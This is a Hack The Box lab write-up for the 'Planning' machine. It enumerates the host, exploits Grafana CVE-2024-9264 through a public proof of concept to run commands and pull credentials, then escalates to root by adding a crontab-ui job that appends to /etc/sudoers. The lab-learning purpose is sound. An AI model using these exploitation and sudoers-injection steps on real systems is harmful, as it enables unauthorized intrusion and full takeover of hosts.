---
clayout: ctf
title: Planning
date: 2025-07-26
image: /ctf/hack-the-box/machines/planning/info-card.png
type: Hack The Box

ctf:
    - name: Planning
      link: https://app.hackthebox.com/machines/660
      thumbnail: /ctf/hack-the-box/machines/planning/info-card.png
      pwned:
        - link: https://labs.hackthebox.com/achievement/machine/585215/660
          thumbnail: /ctf/hack-the-box/machines/planning/pwned.png
---

## Machine Information

As is common in real life pentests, you will start the Planning box with credentials for the following account:

- Username: `admin`
- Password: `0D5oT70Fq13EvB5r`

## Enumeration

### Nmap Scan

```bash
nmap -sC -sV -v -A -oN nmap.txt 10.10.11.68
```

**Results:**

```bash
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 62fff6d4578805adf4d3de5b9bf850f1 (ECDSA)
|_  256 4cce7d5cfb2da09e9fbdf55c5e61508a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://planning.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
```

The scan revealed two open ports:

- **Port 22 (SSH):** OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
- **Port 80 (HTTP):** nginx 1.24.0 (Ubuntu)

## Web Application Enumeration

### Hostname Resolution

The domain `planning.htb` did not resolve automatically. To fix this, we added an entry to `/etc/hosts`:

```bash
echo "10.10.11.68 planning.htb" >> /etc/hosts
```

### Manual Inspection

Navigating to `http://planning.htb` revealed a web application named Edukate.

![Home page of the Edukate website](/ctf/hack-the-box/machines/planning/home-page.png){style="border-radius: 10px;"}

No obvious functionality or vulnerabilities were observed through manual inspection.

### Virtual Host Enumeration

Using `gobuster vhost` we can enumerate the subdomains:

```bash
gobuster vhost \
  -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
  -u "http://planning.htb" \
  -o gobuster-vhost.txt \
  -t 20 \
  --append-domain
```

**Results:**

```bash
Found: grafana.planning.htb Status: 302 [Size: 29] [--> /login]
```

Adding the subdomain to `/etc/hosts`:

```bash
echo "10.10.11.68 grafana.planning.htb" >> /etc/hosts
```

### Grafana – Authenticated Access and Exploitation

Accessing `http://grafana.planning.htb` presented a Grafana login portal:

![Grafana login page](/ctf/hack-the-box/machines/planning/grafana-login.png)

Using the initial credentials (`admin:0D5oT70Fq13EvB5r`), we successfully logged in:

![Grafana dashboard](/ctf/hack-the-box/machines/planning/grafana-dashboard.png)

> [!NOTE]
> Grafana is an open-source platform for monitoring and observability.

By inspecting the UI (via the help menu), the version was identified as **Grafana v11.0.0 (83b9528bce)**.

### Exploiting CVE-2024-9264 (RCE via SQL Injection)

Grafana v11.0.0 is affected by [CVE-2024-9264](https://grafana.com/blog/2024/10/17/grafana-security-release-critical-severity-fix-for-cve-2024-9264/), a critical vulnerability allowing remote command execution and local file inclusion.

Using the public [PoC](https://github.com/nollium/CVE-2024-9264), we confirmed remote code execution:

```bash
python3 CVE-2024-9264.py \
  -u admin \
  -p 0D5oT70Fq13EvB5r \
  -c "id" \
  http://grafana.planning.htb
```

**Output:**

```bash
uid=0(root) gid=0(root) groups=0(root)
```

### Credential Discovery via Environment Variables

By executing `env`, we extracted Grafana's administrative credentials:

```bash
python3 CVE-2024-9264.py \
  -u admin \
  -p 0D5oT70Fq13EvB5r \
  -c "env" \
  http://grafana.planning.htb
```

**Output:**

```bash
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
GF_SECURITY_ADMIN_USER=enzo
```

### Shell Access via SSH

Using the credentials discovered via RCE, we successfully logged in via SSH:

```bash
ssh enzo@planning.htb
# Password: RioTecRANDEntANT!
```

**Output:**

```bash
enzo@planning:~$ id
uid=1000(enzo) gid=1000(enzo) groups=1000(enzo)
```

The user flag is in the `/home/enzo/user.txt` file.

## Privilege Escalation

### Linpeas

Post-exploitation enumeration using **LinPEAS** highlighted the presence of a global npm module:

- **Module**: crontab-ui (Dockerfile exposes the application on port 8000)
- We found a database file at `/opt/crontabs/crontab.db`.

```bash
cat /opt/crontabs/crontab.db
```

**Output:**

```json
{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
```

This indicates a **cron job running** as root every minute, invoking a script located in `/root/scripts/`. Another job archives Grafana backups and uses the password `P4ssw0rdS0pRi0T3c`, embedded in a zip command.

### Exploiting Local Web Interface

The `Dockerfile` exposes the application on port `8000`. Looking at the `netstat` output, we can see that the port is listening locally:

```bash
(netstat -punta || ss --ntpu)

tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
```

### Port Forwarding via SSH

To access the service, we can use SSH port forwarding:

```bash
ssh -L 1337:localhost:8000 enzo@planning.htb
```

### Accessing crontab-ui

Navigating to `http://localhost:1337` displayed the crontab-ui login page.

- Username: `admin`
- Password: `P4ssw0rdS0pRi0T3c`

Upon login, we gained access to the web interface:

![Cronjob dashboard](/ctf/hack-the-box/machines/planning/cronjob-dashboard.png)

### Privilege Escalation via Cron Injection

Through the Cronjob UI, we can create a new cronjob that will execute a command who will change the authorisation of the `enzo` user.

![Cronjob creation](/ctf/hack-the-box/machines/planning/cronjob-creation.png)

```bash
echo "enzo ALL=(ALL:ALL) ALL" >> /etc/sudoers
```

After running the cron job, we checked sudo privileges:

```bash
sudo -l
```

**Results:**

```bash
User enzo may run the following commands on planning:
    (ALL : ALL) ALL
```

### Root Shell

With unrestricted sudo access, we can get a root shell:

```bash
su
```

**Output:**

```bash
root@planning:~# id
uid=0(root) gid=0(root) groups=0(root)
```

The root flag is in the `/root/root.txt` file.